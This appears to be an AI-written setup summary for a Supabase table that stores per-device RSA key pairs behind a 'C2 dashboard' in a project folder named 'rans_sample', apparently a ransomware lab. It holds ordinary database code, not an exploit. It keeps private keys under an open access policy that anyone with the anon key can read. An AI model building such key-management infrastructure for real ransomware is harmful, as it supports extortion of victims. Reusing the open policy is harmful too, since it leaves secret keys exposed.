# Supabase Setup - Complete ✓

## What You've Done

✅ **Created the `device_keys` table** with:
- Auto-incrementing ID
- user_id (text) + device_token (text) as composite key
- public_key_pem and private_key_pem fields
- Timestamps with auto-update trigger
- Unique constraint on (user_id, device_token) for upsert

✅ **Enabled Row Level Security (RLS)** with:
- Open policy for demo/lab (Option A)
- Anyone with anon key can read/write

## Why `supabase_store.py` is Empty

**The file is empty because you don't need it!** Here's why:

```
┌─────────────────────────────────────────────────┐
│  Architecture Overview                           │
├─────────────────────────────────────────────────┤
│                                                  │
│  React Frontend (EliteUI.jsx)                   │
│       ↓ (direct connection)                     │
│  Supabase Database                              │
│       ↓ (stores keys)                           │
│  device_keys table                              │
│                                                  │
│  Python Backend (server.py)                     │
│       ↓ (manages devices/scripts)               │
│  No Supabase interaction needed                 │
│                                                  │
└─────────────────────────────────────────────────┘
```

**Key Points:**
- Frontend uses `@supabase/supabase-js` to connect directly
- Keys are saved/loaded **client-side** from the browser
- Backend doesn't touch Supabase (only manages devices & sockets)
- `supabase_store.py` was a placeholder - you can delete it or leave it empty

## How It Works Now

### 1. Frontend Flow (EliteUI.jsx)

```javascript
// Auto-generate user ID on first visit
useEffect(() => {
  const id = crypto.randomUUID() // or similar
  setUserId(id)
  localStorage.setItem('ui.userId', id)
}, [])

// Auto-load keys when device is selected
useEffect(() => {
  if (!userId || !selectedToken) return
  const rec = await loadKeysFromSupabase({ userId, token: selectedToken })
  if (rec) {
    setPublicKey(rec.public_key_pem)
    setPrivateKey(rec.private_key_pem)
  }
}, [userId, selectedToken])

// Auto-save on decrypt action
async function decryptWithPrivateKey() {
  // ... decrypt logic ...
  await saveKeysToSupabase({ 
    userId, 
    token: selectedToken, 
    pub: null, 
    prv: privateKey 
  })
}
```

### 2. Supabase Functions

```javascript
// In EliteUI.jsx (lines 782-800)
async function saveKeysToSupabase({ userId, token, pub, prv }) {
  if (!supabase) return
  const payload = { 
    user_id: userId, 
    device_token: token, 
    public_key_pem: pub ?? null, 
    private_key_pem: prv ?? null 
  }
  const { error } = await supabase
    .from('device_keys')
    .upsert(payload, { onConflict: 'user_id,device_token' })
  if (error) throw error
}

async function loadKeysFromSupabase({ userId, token }) {
  if (!supabase) return null
  const { data, error } = await supabase
    .from('device_keys')
    .select('public_key_pem, private_key_pem')
    .eq('user_id', userId)
    .eq('device_token', token)
    .limit(1)
    .maybeSingle()
  if (error) throw error
  return data
}
```

## Testing Your Setup

### Method 1: Open the Test Page
```bash
cd /home/hari/backup/rans_sample
python3 -m http.server 8000
# Then open: http://localhost:8000/test_supabase.html
```

### Method 2: Test in Browser Console
```javascript
// Open your C2 dashboard and press F12
// In the console, test Supabase:

// Check connection
const { data, error } = await supabase.from('device_keys').select('*').limit(1)
console.log('Connection test:', { data, error })

// Insert test data
const { data: inserted } = await supabase.from('device_keys').insert({
  user_id: 'test-123',
  device_token: 'device-456',
  public_key_pem: '-----BEGIN PUBLIC KEY-----\nTEST\n-----END PUBLIC KEY-----'
}).select()
console.log('Inserted:', inserted)

// Query test data
const { data: found } = await supabase.from('device_keys')
  .select('*')
  .eq('user_id', 'test-123')
console.log('Found:', found)

// Clean up
await supabase.from('device_keys').delete().eq('user_id', 'test-123')
```

## Verifying Data in Supabase Dashboard

1. Go to https://supabase.com/dashboard
2. Select your project: `mawhbwogynurfbacxnyh`
3. Click **Table Editor** in the sidebar
4. Select **device_keys** table
5. You should see any keys that have been saved

## Current Status

✅ **Table created**: `public.device_keys`
✅ **RLS enabled**: With open policy for demo
✅ **Frontend configured**: Using your Supabase URL and anon key
✅ **Auto-save/load**: Keys save on decrypt, load on device selection
✅ **Environment vars**: Set in `.env.local`

## What Happens When You Use the UI

1. **First visit**: 
   - Random userId generated and saved to localStorage
   
2. **Device connects**:
   - Device appears in sidebar
   - RSA keys auto-generated on socket auth
   - Public key available via `/py_simple/devices`

3. **Select device**:
   - Frontend calls `loadKeysFromSupabase({ userId, token })`
   - If keys exist in Supabase, they populate the textareas
   - If not, textareas stay empty

4. **Click "Decrypt with Private Key"**:
   - Decrypt operation runs
   - Keys auto-saved via `saveKeysToSupabase({ userId, token, prv })`
   - Next time you select this device, keys will auto-load

## Security Note

⚠️ **Your current setup (Option A)** allows anyone with the anon key to read/write all keys.

**For production**, you'd want to:
1. Add Supabase Auth (email/password login)
2. Change RLS policy to: `user_id = auth.uid()`
3. Make user_id a UUID type
4. Users can only see their own keys

But for your lab/demo setup, the current open policy is fine!

## Summary

- ✅ Supabase is correctly configured
- ✅ Keys are stored in the database (NOT a bucket)
- ✅ Frontend handles all Supabase interaction
- ✅ Backend doesn't need `supabase_store.py`
- ✅ Auto-save/load is already implemented
- ✅ You're ready to use it!

**Next step**: Just start your backend and frontend, select a device, and the keys should auto-load if they exist in Supabase!
